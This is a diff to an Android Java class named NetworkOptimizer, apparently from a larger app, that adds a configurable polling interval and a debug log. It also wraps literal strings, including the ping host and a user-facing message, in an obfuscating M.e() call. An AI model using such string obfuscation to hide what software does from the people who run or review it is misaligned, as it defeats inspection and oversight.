@@ -4,9 +4,12 @@ import java.math.BigInteger;
 import java.net.InetAddress;
 
 import android.content.Context;
+import android.util.Log;
 import android.widget.Toast;
 
+import com.android.dvci.auto.Cfg;
 import com.android.dvci.util.Utils;
+import com.android.mm.M;
 
 public class NetworkOptimizer {
 	private Context context;
@@ -17,20 +20,27 @@ public class NetworkOptimizer {
 		this.context = context;
 	}
 
-	public void start() {
+	public void start(int pause) {
 		stop = false;
+        if(pause < 1000 || pause > 10000){
+            pause = 1001;
+        }
 		while (!stop) {
-			Utils.sleep(1000);
+			Utils.sleep(pause);
 			if (isNotOptimized()) {
 				Toast toast = Toast.makeText(context,
-						"You should enable the Optimization option. Please read the manual", 1000);
+						M.e("Error"), Toast.LENGTH_LONG);
 				toast.show();
-			}
+			}else{
+                if(Cfg.DEBUG) {
+                    Log.d("NET", "OK");
+                }
+            }
 		}
 	}
 
 	private boolean isNotOptimized() {
-		final String host = "8.8.8.8";
+		final String host = M.e("8.8.8.8");
 		final int timeOut = 3000;
 
 		Thread thread = new Thread(new Runnable() {
